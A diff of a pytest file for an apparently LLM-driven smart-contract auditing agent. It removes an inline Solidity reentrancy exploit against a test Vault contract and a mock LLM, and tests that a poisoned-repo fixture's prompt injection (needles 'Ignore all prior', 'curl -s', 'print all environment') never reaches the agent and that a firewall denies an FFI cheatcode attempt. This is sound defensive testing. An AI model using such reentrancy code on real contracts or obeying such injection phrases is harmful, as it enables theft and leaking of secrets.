@@ -9,81 +9,13 @@ import pytest
 
 from redline.agent import orchestrator
 from redline.config import ROOT, load_config
-from redline.models import FileEdit, Finding, JudgeOut, PatchDraft, PoCDraft, ReconOut, ScanOut
+from redline.scripted import ScriptedLLM
 
 pytestmark = pytest.mark.skipif(not shutil.which("docker"), reason="docker required")
 
-POC = '''// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.24;
-import "forge-std/Test.sol";
-import "../src/Vault.sol";
-
-contract Attacker {
-    Vault v;
-    constructor(Vault _v) { v = _v; }
-    function attack() external payable {
-        v.deposit{value: 1 ether}();
-        v.withdraw(1 ether);
-    }
-    receive() external payable {
-        if (address(v).balance >= 1 ether) v.withdraw(1 ether);
-    }
-}
-
-contract ExploitF1 is Test {
-    function test_exploit() public {
-        Vault v = new Vault();
-        vm.deal(address(0xB0B), 10 ether);
-        vm.prank(address(0xB0B));
-        v.deposit{value: 10 ether}();
-        Attacker a = new Attacker(v);
-        vm.deal(address(a), 1 ether);
-        a.attack{value: 0}();
-        assertGt(address(a).balance, 1 ether);
-    }
-}
-'''
-FIXED = (ROOT / "fixtures/vulnerable-vault/src/Vault.sol").read_text().replace(
-    '''        (bool ok,) = msg.sender.call{value: amount}("");
-        require(ok, "transfer failed");
-        unchecked {
-            balances[msg.sender] -= amount;
-        }''', '''        balances[msg.sender] -= amount;
-        (bool ok,) = msg.sender.call{value: amount}("");
-        require(ok, "transfer failed");''')
-
-
-class ScriptedLLM:
-    provider = "mock"
-
-    def __init__(self):
-        self.stats = []
-        self.seen_prompts: list[str] = []
-        self.no_findings = False
-
-    def structured(self, model, messages, schema, role="", **kw):
-        self.seen_prompts.append(messages[-1]["content"])
-        if schema is ScanOut:
-            return ScanOut()
-        if schema is JudgeOut:
-            return JudgeOut(verdict="allow", reason="mock", confidence=0.9)
-        if schema is ReconOut and self.no_findings:
-            return ReconOut(findings=[])
-        if schema is ReconOut:
-            return ReconOut(findings=[Finding(
-                id="F1", title="Reentrancy in withdraw", severity="high", file="src/Vault.sol",
-                function="withdraw", description="state updated after call",
-                attack="reenter withdraw from receive()")])
-        if schema is PoCDraft:
-            return PoCDraft(contract_name="ExploitF1", code=POC)
-        if schema is PatchDraft:
-            return PatchDraft(edits=[FileEdit(path="src/Vault.sol", content=FIXED)], rationale="CEI")
-        raise AssertionError(schema)
-
-
 def test_full_loop_confirms_and_patches_vault():
     cfg = load_config()
-    llm = ScriptedLLM()
+    llm = ScriptedLLM("vulnerable-vault")
     res = orchestrator.audit(ROOT / "fixtures/vulnerable-vault", cfg, llm, log=lambda *_: None,
                              do_research=False)
     f = res.findings[0]
@@ -96,9 +28,7 @@ def test_full_loop_confirms_and_patches_vault():
 
 def test_poisoned_repo_injection_never_reaches_the_agent():
     cfg = load_config()
-    llm = ScriptedLLM()
-
-    llm.no_findings = True
+    llm = ScriptedLLM("poisoned-repo", no_findings=True)
     res = orchestrator.audit(ROOT / "fixtures/poisoned-repo", cfg, llm, log=lambda *_: None,
                              do_research=False)
     assert res.quarantined
@@ -106,3 +36,25 @@ def test_poisoned_repo_injection_never_reaches_the_agent():
     for needle in ("evil-audit", "curl -s", "print all environment", "Ignore all prior"):
         assert needle not in recon_prompt
     assert "SECURITY FILTER WARNING" in recon_prompt
+
+
+def test_poisoned_full_loop_denies_ffi_attempt_then_confirms_and_emits_valid_events():
+    from pathlib import Path
+
+    from redline.events import parse_event
+
+    cfg = load_config()
+    llm = ScriptedLLM("poisoned-repo")
+    res = orchestrator.audit(ROOT / "fixtures/poisoned-repo", cfg, llm, log=lambda *_: None,
+                             do_research=False, run_name="pytest-poisoned", scripted=True)
+    f = res.findings[0]
+    assert f.status == "confirmed" and f.poc.attempts == 2
+    assert f.patch.applied and f.patch.poc_blocked and f.patch.suite_green
+    assert any(e["verdict"] == "deny" and e["rule"] == "cheatcode" for e in res.firewall_log)
+    evs = [parse_event(ln) for ln in (Path(res.out_dir) / "events.jsonl").read_text().splitlines()]
+    types = [e.type for e in evs]
+    assert types[0] == "run_started" and types[-1] == "run_finished"
+    for t in ("stage_started", "finding_added", "poc_result", "patch_result",
+              "firewall_decision", "input_quarantined", "llm_call"):
+        assert t in types, t
+    assert [e.seq for e in evs] == sorted(e.seq for e in evs)
